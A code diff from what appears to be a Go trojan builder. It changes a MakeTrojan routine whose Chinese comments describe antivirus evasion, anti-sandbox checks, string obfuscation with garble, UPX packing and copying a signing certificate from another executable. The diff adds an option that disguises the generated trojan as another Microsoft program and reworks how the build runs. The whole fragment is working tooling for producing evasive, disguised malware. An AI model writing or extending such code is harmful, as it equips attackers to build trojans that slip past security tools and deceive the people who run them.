@@ -47,7 +47,7 @@ type BuildOption struct {
 	Upx        bool `编译之后是否使用upx进行压缩加壳，压缩效果很好`
 	LiteralObf bool `需配合garble使用！混淆字符串`
 	SeedRandom bool `需配合garble使用！`
-	Race       bool `编译时选取竞争测试，会使文件变大，也会让免杀效果变好`
+	Fake       bool `伪装成其他微软程序`
 	Hide       bool `隐藏黑框,会减少免杀效果`
 }
 
@@ -106,6 +106,10 @@ func MakeTrojan(options Option) {
 	}
 	//添加沙箱
 	addAntiSandbox(options.AntiSandboxOpt)
+	//伪装成微软其他exe
+	if options.BuildOpt.Fake {
+		generatesyso()
+	}
 	//根据build参数生成木马
 	finalBuild(options.BuildOpt, options.DstFile)
 	//窃取签名
@@ -114,6 +118,7 @@ func MakeTrojan(options Option) {
 		writecertfromexe(path.Join(TempDir, "cert-after.exe"), path.Join(TempDir, "cert-before.exe"), options.SignFileLoc)
 		FileCopy(path.Join(TempDir, "cert-after.exe"), options.DstFile)
 	}
+
 	println("build done!")
 	//清理临时文件夹
 	os.RemoveAll(TempDir)
@@ -194,7 +199,7 @@ func finalBuild(buildOpt BuildOption, dstFile string) {
 			"build",
 			"-o",
 			dstFile,
-			path.Join(TempDir, "main.go"),
+			//path.Join(TempDir, "main.go"),
 		}
 		opt := make([]string, 0, 12)
 		if buildOpt.SeedRandom {
@@ -207,6 +212,7 @@ func finalBuild(buildOpt BuildOption, dstFile string) {
 		//println(len(opt))
 		fmt.Printf("%v", opt)
 		cmd := exec.Command("garble", opt...)
+		cmd.Dir = TempDir
 		println(cmd.String())
 		if err := cmd.Run(); err != nil {
 			log.Fatalln(err)
@@ -220,14 +226,13 @@ func finalBuild(buildOpt BuildOption, dstFile string) {
 			"-ldflags",
 			"-s -w",
 		}
-		if buildOpt.Race {
-			command = append(command, "-race")
-		}
-		command = append(command, path.Join(TempDir, "main.go"))
+		//command = append(command, "main.go")
 		cmd := exec.Command("go", command...)
+		cmd.Dir = TempDir
 		println(cmd.String())
 		if err := cmd.Run(); err != nil {
 			log.Fatalln(err)
 		}
 	}
+	FileCopy(path.Join(TempDir, dstFile), dstFile)
 }
